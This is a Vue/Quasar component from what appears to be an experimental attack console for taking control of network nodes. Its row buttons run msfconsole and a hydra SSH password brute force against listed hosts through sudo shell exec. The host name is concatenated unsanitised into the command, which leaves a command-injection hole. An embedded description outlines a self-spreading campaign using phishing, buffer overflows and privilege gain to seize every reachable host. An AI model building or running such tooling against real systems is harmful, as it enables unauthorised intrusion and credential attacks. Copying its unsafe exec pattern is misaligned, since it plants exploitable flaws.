<template>

  <base-content>
    <div class="container q-pa-lg q-col-gutter-md">
      <div class="row q-col-gutter-md">
        <div class="col-xs-12 col-md-9">
          <q-table
            class="cimo-shadow"
            :grid="$q.screen.xs"
            title="传输节点使能"
            :data="data"
            :columns="columns"
            :filter="filter"
            row-key="name"
            style="height: 450px"
          >
            <template v-slot:top-right>
              <q-input dense debounce="300" v-model="filter" placeholder="搜索节点">
                <template v-slot:append>
                  <q-icon name="search"/>
                </template>
              </q-input>
            </template>
            <template v-slot:body="props">
              <q-tr :props="props">
                <q-td key="name" :props="props">{{ props.row.name }}</q-td>
                <q-td key="available" :props="props">{{ props.row.available }}</q-td>
                <q-td key="Transportable" :props="props">{{ props.row.Transportable }}</q-td>
                <q-td key="operating" :props="props">
                <q-btn-group push>
                  <q-btn class="btn-table text-white" push label="植入木马" icon="bug_report" @click="handleTableClick(props.row)"/>
                  <q-btn class="btn-table text-white" push label="字典攻击" icon="apps" @click="handleTableClick2(props.row)"/>
                  <q-btn class="btn-table text-white" push label="抓包分析" icon="tune" @click="handleTableClick3(props.row)"/>
                  <q-btn class="btn-table text-white" push label="用户提权" icon="settings_accessibility" @click="handleTableClick4(props.row)"/>
                </q-btn-group>
                </q-td>
              </q-tr>
            </template>
          </q-table>
          <q-card>
            <q-img
              class="cimo-shadow"
              :grid="$q.screen.xs"
              :src="this.$PUBLIC_PATH + 'data/传输节点使能.png'"
            />
          </q-card>
        </div>
        <div class="col-xs-12 col-md-3">
          <q-card class="my-card cimo-shadow">
            <q-card-section>
              <div class="text-overline text-orange-9">传输节点使能（获取控制权）</div>
            </q-card-section>
            <q-card-actions>
              <q-btn
                color="grey"
                label="扩散模型简介"
                round
                flat
                dense
                :icon="expanded ? 'keyboard_arrow_up' : 'keyboard_arrow_down'"
                @click="expanded = !expanded"
              />
            </q-card-actions>
            <q-slide-transition>
              <div v-show="expanded">
                <q-separator/>
                <q-card-section class="text-subitle2">
                  {{ lorem }}
                </q-card-section>
              </div>
            </q-slide-transition>
          </q-card>
        </div>
      </div>
    </div>
  </base-content>

</template>

<script>
import { exportFile } from 'quasar'
import BaseContent from '../../components/BaseContent/BaseContent'
import { thumbStyle } from 'components/BaseContent/ThumbStyle'
import chartPie from '../../assets/js/echarts-1'
import charts2Option from '../../assets/js/echarts-2'
import { income, expense, total } from '../../assets/js/echarts-3'
import chartZ from '../../assets/js/echarts-4'

const exec = require('child_process').exec

function wrapCsvValue (val, formatFn) {
  let formatted = formatFn !== undefined
    ? formatFn(val)
    : val

  formatted = formatted === undefined || formatted === null
    ? ''
    : String(formatted)

  formatted = formatted.split('"').join('""')
  /**
   * Excel accepts \n and \r in strings, but some other CSV parsers do not
   * Uncomment the next two lines to escape new lines
   */
  // .split('\n').join('\\n')
  // .split('\r').join('\\r')

  return `"${formatted}"`
}

export default {
  name: 'home',
  components: {
    BaseContent
  },
  data () {
    return {
      expanded: true,
      chartPie,
      chartZ,
      charts2Option,
      income,
      expense,
      total,
      thumbStyle,
      lorem: '扩散主要包括获权、传递和激活三种活动，邻近节点的使能主要通过扩散活动完成。首先，从网络中已受控制的主机出发，结合其可达活跃主机的攻击难易程度和可用性信息，确定下一步节点攻击顺序；从中选择易于攻击且可用性强的节点进行首次攻破，采取钓鱼攻击欺骗执行，远程登录控制和缓冲区溢出攻击等方式，获取目标主机的普通权限，实现获权活动。其次接着，收集采集获权主机的CPU、内存以及存储空间等信息，进行节点NDN可用性评估，将不满足条件的纳入已控制节点继续迭代执行获权活动；满足条件的节点则远程控制下载或者传入安装文件，完成传递活动。再次然后，在目标主机中安装配置NDN网络环境，接入到当前NDN网络中，实现当前节点的传播，并将该节点加入到控制节点中；若仍存在未控制节点，则继续迭代执行扩散活动，直至网络中所有满足条件节点全部受控。因此，本节的重点是如何获得更多主机的控制权限，并安装配置和激活节点的NDN网络。',
      filter: '',
      columns: [
        {
          name: 'name',
          required: true,
          label: '主机节点感知',
          align: 'left',
          field: row => row.name,
          format: val => `${val}`,
          sortable: true
        },
        {
          name: 'available',
          align: 'center',
          label: '节点可用性',
          field: 'available',
          sortable: true
        },
        {
          name: 'Transportable',
          align: 'center',
          label: '节点传输能力',
          field: 'Transportable',
          sortable: true
        },
        {
          name: 'operating',
          label: '使能操作',
          align: 'center',
          field: 'operating',
          sortable: true
        }
      ],
      data: []
    }
  },
  methods: {
    getMsg () {
      this.isLoadingVisible = !this.isLoadingVisible
      const query = {
        url: this.$PUBLIC_PATH + 'data/menu4.json',
        method: 'get'
      }
      this.$fetchData(query).then(res => {
        this.isLoadingVisible = !this.isLoadingVisible
        console.log(res)
        for (var i in res.data.data) {
          this.data.push(res.data.data[i])
        }
      }).catch(error => {
        console.log(error)
      })
    },
    // 植入木马
    handleTableClick (e) {
      exec('sudo gnome-terminal -x bash -c "/opt/metasploit-framework/bin/msfconsole; exec bash"', { cwd: '/root/' },
        function (error, stdout, stderr) {
          if (error) {
            console.error('error: ' + error)
            return
          }
          console.log('stdout: ' + stdout)
          console.log('stderr: ' + typeof stderr)
        })
    },
    handleTableClick2 (e) {
      console.log(e.name)
      exec('sudo gnome-terminal -x bash -c "hydra -l root -P passlist.txt ' + e.name + ' ssh; exec bash"', { cwd: '/root/electron_APP/electron_test/攻击获权实验部署/攻击获权实验部署/hydra/thc-hydra-9.0/' },
        function (error, stdout, stderr) {
          if (error) {
            console.error('error: ' + error)
            return
          }
          console.log('stdout: ' + stdout)
          console.log('stderr: ' + typeof stderr)
        })
    },
    handleTableClick3 (e) {
      this.$router.push({
        path: 'table-detail',
        query: {
          id: e.name
        }
      })
    },
    handleTableClick4 (e) {
      this.$router.push({
        path: 'table-detail',
        query: {
          id: e.name
        }
      })
    },
    exportTable () {
      // naive encoding to csv format
      const content = [this.columns.map(col => wrapCsvValue(col.label))].concat(
        this.data.map(row => this.columns.map(col => wrapCsvValue(
          typeof col.field === 'function'
            ? col.field(row)
            : row[col.field === undefined ? col.name : col.field],
          col.format
        )).join(','))
      ).join('\r\n')

      const status = exportFile(
        'table-export.csv',
        content,
        'text/csv'
      )

      if (status !== true) {
        this.$q.notify({
          message: 'Browser denied file download...',
          color: 'negative',
          icon: 'warning'
        })
      }
    }
  },
  created () {
    this.getMsg()
  }
}
</script>
<style lang="css" scoped>
  .my-card {
    width: 100%;
    min-height: 390px;
    height: 100%;
    /*max-width: 350px;*/
  }

  .income {
    width: 100%;
    background: linear-gradient(to right, #68E4BC 0%, #4AD0D1 99%);
    border-radius: 5px;
    font-size: 14px;
    padding: 11px 15px;
    font-weight: bold;
    width: 100%;
    cursor: pointer;
    transition: all 0.3s ease-in-out;
    color: #ffffff;
    box-shadow: 0 12px 12px -11px #0db4afb8;
    background-size: 200% auto;
  }

  .income:hover {
    background-position: right center;
    box-shadow: 0 12px 20px -11px #0db4afb8;
  }

  .expense {
    width: 100%;
    background: linear-gradient(to left, #FCAC94 0%, #f3a183 98%);
    border-radius: 5px;
    font-size: 14px;
    padding: 11px 15px;
    font-weight: bold;
    width: 100%;
    cursor: pointer;
    transition: all 0.3s ease-in-out;
    color: #ffffff;
    box-shadow: 0 12px 12px -11px #FCA76C;
    background-size: 200% auto;
  }

  .expense:hover {
    background-position: right center;
    box-shadow: 0 12px 20px -11px #FCA76C;
  }

  .total {
    width: 100%;
    background: linear-gradient(90deg, #F073C8 0%, #FF6A95 99%);
    border-radius: 5px;
    font-size: 14px;
    padding: 11px 15px;
    font-weight: bold;
    width: 100%;
    cursor: pointer;
    transition: all 0.3s ease-in-out;
    color: #ffffff;
    box-shadow: 0 12px 12px -11px rgba(240, 115, 200, 0.73);
    background-size: 200% auto;
  }

  .total:hover {
    background-position: right center;
    box-shadow: 0 12px 20px -11px rgba(240, 115, 200, 0.73);
  }

  .btn-table {
    background: linear-gradient(to right, #36d1dc, #5b86e5);
    transition: all 0.3s ease-in-out;
  }

  .btn-table:hover {
    background-position: right center;
    box-shadow: 0 12px 20px -11px #5b86e5;
  }
</style>
